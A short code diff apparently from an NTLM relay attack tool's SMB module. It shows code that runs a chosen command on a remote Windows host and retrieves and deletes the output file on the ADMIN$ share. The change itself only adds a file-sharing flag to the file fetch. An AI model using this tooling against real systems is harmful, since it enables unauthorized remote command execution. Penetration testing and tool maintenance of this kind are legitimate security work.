@@ -191,7 +191,7 @@ class SMBAttack(ProtocolAttack):
                     if self.config.command is not None:
                         remoteOps._RemoteOperations__executeRemote(self.config.command)
                         LOG.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
-                        self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
+                        self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer, smb.FILE_SHARE_READ)
                         self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                         print(self.__answerTMP.decode(self.config.encoding, 'replace'))
                     else:
